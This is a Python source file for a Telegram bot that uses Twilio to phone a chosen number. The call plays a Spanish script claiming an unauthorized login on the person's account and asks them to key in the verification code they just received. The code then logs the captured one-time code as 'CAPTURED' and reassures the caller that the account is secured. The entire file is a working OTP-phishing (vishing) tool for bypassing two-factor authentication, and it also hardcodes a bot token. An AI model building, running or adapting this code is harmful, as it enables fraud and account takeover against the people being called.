import os
import asyncio
import time
import random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from fastapi import FastAPI, Request, Form
import uvicorn
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse

# --- CONFIGURACIÓN DE CREDENCIALES ---
TOKEN = os.getenv("BOT_TOKEN", "9092757832:AAE6wgojw0jj7DX1TfAGg-3i1bjQjqf2euE")
TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID", "TU_ACCOUNT_SID")
TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN", "TU_AUTH_TOKEN")
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER", "+1XXXXXXXXXX")
RENDER_URL = os.getenv("RENDER_URL", "https://tu-proyecto.onrender.com")

bot = Bot(token=TOKEN)
dp = Dispatcher()
app = FastAPI()

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    await message.answer(
        "👋 ¡Bienvenido al sistema de alertas IVR!\n\n"
        "Para iniciar una llamada de seguridad automatizada, usa el comando:\n"
        "`/llamar +1234567890 Nombre`",
        parse_mode="Markdown"
    )

@dp.message(F.text.startswith("/llamar"))
async def iniciar_llamada(message: types.Message):
    partes = message.text.split(maxsplit=2)
    if len(partes) < 3:
        await message.answer("⚠️ Formato incorrecto. Usa: `/llamar +18095551234 Juan Pérez`", parse_mode="Markdown")
        return
    
    telefono_destino = partes[1]
    nombre = partes[2]
    
    try:
        client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
        
        twiml_url = f"{RENDER_URL}/generar-twiml?nombre={nombre}"
        
        call = client.calls.create(
            to=telefono_destino,
            from_=TWILIO_PHONE_NUMBER,
            url=twiml_url,
            method="POST"
        )
        
        await message.answer(
            f"📞 **¡Llamada en curso!**\n\n"
            f"👤 **Destinatario:** {nombre}\n"
            f"📱 **Número:** `{telefono_destino}`\n"
            f"🆔 **Call SID:** `{call.sid}`\n\n"
            f"Esperando que marque el código OTP...",
            parse_mode="Markdown"
        )
    except Exception as e:
        await message.answer(f"❌ Error al realizar la llamada: {str(e)}")

# --- ENDPOINTS DE FASTAPI PARA TWILIO ---

@app.post("/generar-twiml")
async def generar_twiml(request: Request):
    params = request.query_params
    nombre = params.get("nombre", "Cliente")
    
    response = VoiceResponse()
    
    gather = response.gather(
        num_digits=6,
        action=f"{RENDER_URL}/procesar-codigo",
        method="POST"
    )
    
    gather.say(
        f"Alerta de seguridad urgente en su cuenta. "
        f"Hemos detectado un acceso no autorizado desde un dispositivo desconocido a nombre de {nombre}. "
        f"Para bloquear este acceso de inmediato y proteger su cuenta, "
        f"por favor marque en su teclado el código de verificación que acaba de recibir.",
        language="es-ES"
    )
    
    response.say("No hemos recibido su respuesta. Por favor, marque su código de verificación ahora.", language="es-ES")
    return str(response)

@app.post("/procesar-codigo")
async def procesar_codigo(request: Request, Digits: str = Form(default=None)):
    if Digits:
        print(f"¡CÓDIGO OTP CAPTURADO!: {Digits}")
    
    response = VoiceResponse()
    response.say("Gracias. Su cuenta ha sido asegurada con éxito. Adiós.", language="es-ES")
    return str(response)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
